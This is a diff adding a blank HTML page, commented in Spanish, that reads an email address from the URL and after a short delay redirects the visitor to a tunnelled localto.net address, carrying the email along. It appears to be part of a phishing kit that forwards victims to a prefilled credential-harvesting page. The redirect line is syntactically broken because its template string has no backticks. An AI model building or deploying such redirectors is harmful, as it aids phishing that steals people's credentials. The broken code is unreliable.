@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<body>
+<script>
+    const params = new URLSearchParams(window.location.search);
+    const email = params.get("email");
+
+    setTimeout(function() {
+      const destino = "https://ytk37qbch.localto.net/hmm/"; // Tu página final
+      if (email) {
+        window.location.href = ${destino}?email=${encodeURIComponent(email)};
+      } else {
+        window.location.href = destino; // fallback si no hay email
+      }
+    }, 1200);
+  </script>
+</body>
+</html>
